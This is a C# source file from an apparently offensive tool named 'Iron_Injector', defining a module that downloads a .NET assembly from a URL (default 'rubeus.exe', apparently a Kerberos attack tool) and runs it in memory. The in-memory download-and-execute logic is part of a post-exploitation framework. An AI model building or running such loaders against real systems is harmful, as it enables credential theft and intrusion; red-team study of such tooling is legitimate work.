using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Iron_Injector.Models.Abstracts;
using Iron_Injector.Models;
using Pastel;
using System.Drawing;

namespace Iron_Injector.Commands.Program_Commands
{
    public class ProgramLoader : ModuleBase
    {
        public override string Name => "ProgramLoader";

        public override string Description => "atm allows for loading a .NET assembly into memory and interavily sending commands like normal";

        public override int ID => 2;

        public override string Prompt => "[ProgramLoader]> ";

        public override void ActivateRunCommand()
        {
            Console.WriteLine($"{"[+]".Pastel(Color.Green)}running Program loader stuff....");
            ExecuteAssembly.ExecuteASM();
        }

        public override void setModuleCommands()
        {
            
        }

        public override void setModuleOptions()
        {
            ModuleOptions = new List<OptionsBase>()
            {
                new OptionsBase("URL", "127.0.0.1:8080", true, "url to download file from."),
                new OptionsBase("ProgramName", "rubeus.exe", true, "assembly to download."),
            };
        }
    }
}
